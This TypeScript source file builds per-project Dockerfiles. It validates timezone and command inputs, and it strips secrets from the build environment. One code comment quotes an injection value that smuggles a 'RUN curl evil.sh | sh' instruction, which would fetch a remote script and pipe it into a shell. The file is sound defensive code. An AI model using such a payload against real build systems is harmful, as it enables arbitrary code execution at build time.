/**
 * Per-project Dockerfile generation
 */

import { IMAGE_NAME } from './docker-utils'
import { validatePackageNames } from './docker-security'

/**
 * Generate a per-project Dockerfile that extends the base agent image.
 */
export function generateProjectDockerfile(
  baseVersion: string,
  aptPackages: string[],
  npmPackages: string[],
  commands: string[] = [],
  timezone?: string,
): string {
  validatePackageNames(aptPackages, 'apt')
  validatePackageNames(npmPackages, 'npm')

  const lines = [`FROM ${IMAGE_NAME}:${baseVersion}`]
  if (timezone) {
    // Validate before interpolating into the Dockerfile. Without this an
    // attacker-controlled value (e.g. `Asia/Tokyo\nRUN curl evil.sh | sh`)
    // could inject extra Dockerfile instructions and run arbitrary commands
    // at build time. IANA tz names are region/city paths plus a few special
    // forms (UTC, Etc/GMT+9), so restrict to that character set.
    if (!/^[A-Za-z0-9/_+-]+$/.test(timezone)) {
      throw new Error(`Invalid timezone (contains forbidden character): "${timezone.substring(0, 50)}"`)
    }
    // Override the TZ env var set by docker run, allowing per-project custom timezone
    lines.push(`ENV TZ=${timezone}`)
  }
  if (aptPackages.length > 0) {
    lines.push(
      `RUN apt-get update && apt-get install -y --no-install-recommends \\`,
      `    ${aptPackages.join(' \\\n    ')} \\`,
      `    && rm -rf /var/lib/apt/lists/*`,
    )
  }
  if (npmPackages.length > 0) {
    lines.push(
      `RUN npm install -g ${npmPackages.join(' ')} && npm cache clean --force`,
    )
  }
  for (const cmd of commands) {
    if (/[\n\r|`;$()]/.test(cmd)) {
      throw new Error(`Invalid command (contains forbidden character): "${cmd.substring(0, 50)}"`)
    }
    lines.push(`RUN ${cmd}`)
  }
  return lines.join('\n') + '\n'
}

/**
 * Returns the minimal environment variables needed for docker build.
 * Excludes sensitive variables (API keys, tokens) that should not be available during build.
 */
export function buildDockerEnv(): NodeJS.ProcessEnv {
  const ALLOWED_KEYS = ['PATH', 'HOME', 'USER', 'TMPDIR', 'TMP', 'TEMP', 'LANG', 'LC_ALL']
  const env: NodeJS.ProcessEnv = {}
  for (const key of ALLOWED_KEYS) {
    if (process.env[key] !== undefined) {
      env[key] = process.env[key]
    }
  }
  env['BUILDKIT_PROGRESS'] = 'plain'
  return env
}
